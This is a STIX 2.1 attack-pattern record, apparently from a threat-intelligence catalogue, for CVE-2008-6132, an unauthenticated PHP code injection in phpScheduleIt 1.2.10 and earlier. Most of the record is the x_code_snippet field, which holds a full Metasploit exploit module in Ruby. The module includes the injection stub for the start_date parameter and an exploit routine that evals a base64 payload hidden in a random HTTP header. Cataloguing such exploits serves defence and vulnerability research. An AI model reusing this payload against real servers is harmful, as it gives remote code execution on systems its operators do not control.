{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--26fb6788-47a6-4581-8da6-c7e252c07855",
    "created": "2024-08-14T17:09:49.511036Z",
    "modified": "2024-08-14T17:09:49.511041Z",
    "name": "phpScheduleIt PHP reserve.php start_date Parameter Arbitrary Code Injection",
    "description": " This module exploits an arbitrary PHP code execution flaw in the phpScheduleIt software. This vulnerability is only exploitable when the magic_quotes_gpc PHP option is 'off'. Authentication is not required to exploit the bug.  Version 1.2.10 and earlier of phpScheduleIt are affected. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/phpscheduleit_start_date.rb",
            "external_id": "phpscheduleit_start_date.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-6132"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'phpScheduleIt PHP reserve.php start_date Parameter Arbitrary Code Injection',\n      'Description'    => %q{\n          This module exploits an arbitrary PHP code execution flaw in the phpScheduleIt\n        software. This vulnerability is only exploitable when the magic_quotes_gpc PHP\n        option is 'off'. Authentication is not required to exploit the bug.\n\n        Version 1.2.10 and earlier of phpScheduleIt are affected.\n      },\n      'Author'         =>\n        [\n          'EgiX',        # Vulnerability Discovery and Exploit\n          'juan vazquez' # Metasploit module\n        ],\n      'License'        => BSD_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2008-6132'],\n          ['OSVDB', '48797'],\n          ['BID', '31520'],\n          ['EDB', '6646'],\n        ],\n      'Privileged'     => false,\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Payload'        =>\n        {\n          # max header length for Apache,\n          # http://httpd.apache.org/docs/2.2/mod/core.html#limitrequestfieldsize\n          'Space'       => 8190,\n          'DisableNops' => true,\n          'Keys'        => ['php'],\n        },\n      'Targets'        => [ ['Automatic', { }] ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2008-10-01'))\n\n    register_options(\n      [\n        OptString.new('URI', [ true,  \"The full URI path to phpScheduleIt\", '/phpscheduleit']),\n      ])\n  end\n\n  def check\n    signature = rand_text_alpha(rand(10)+10)\n    stub = \"1').${print('#{signature}')}.${die};#\"\n    my_payload = \"btnSubmit=1&start_date=#{stub}\"\n\n    uri = normalize_uri(datastore['URI'])\n    uri << '/' if uri[-1,1] != '/'\n\n    vprint_status(\"Checking uri #{uri}\")\n\n    response = send_request_cgi({\n      'method' => \"POST\",\n      'global' => true,\n      'uri' => uri,\n      'headers' => {\n          'Referer' => uri,\n        },\n      'data' => \"#{my_payload}\"\n    }, 25)\n\n    if response.code == 200 and response.body =~ /#{signature}/\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    headername = \"X-\" + Rex::Text.rand_text_alpha_upper(rand(10)+10)\n    stub = \"1').${error_reporting(0)}.${eval(base64_decode($_SERVER[HTTP_#{headername.gsub(\"-\", \"_\")}]))};#\"\n    my_payload = \"btnSubmit=1&start_date=#{stub}\"\n\n    uri = normalize_uri(datastore['URI'])\n    uri << '/' if uri[-1,1] != '/'\n\n    print_status(\"Sending request for: #{uri}\")\n    print_status(\"Payload embedded in header: #{headername}\")\n\n    response = send_request_cgi({\n      'method' => \"POST\",\n      'global' => true,\n      'uri' => uri,\n      'headers' => {\n          headername  => Rex::Text.encode_base64(payload.encoded),\n          'Referer'   => uri\n        },\n      'data' => \"#{my_payload}\"\n    }, 25)\n\n    if response and response.code != 200\n      print_error(\"Server returned a non-200 status code: (#{response.code})\")\n    end\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-10-01",
    "x_mitre_platforms": [
        "['php']"
    ]
}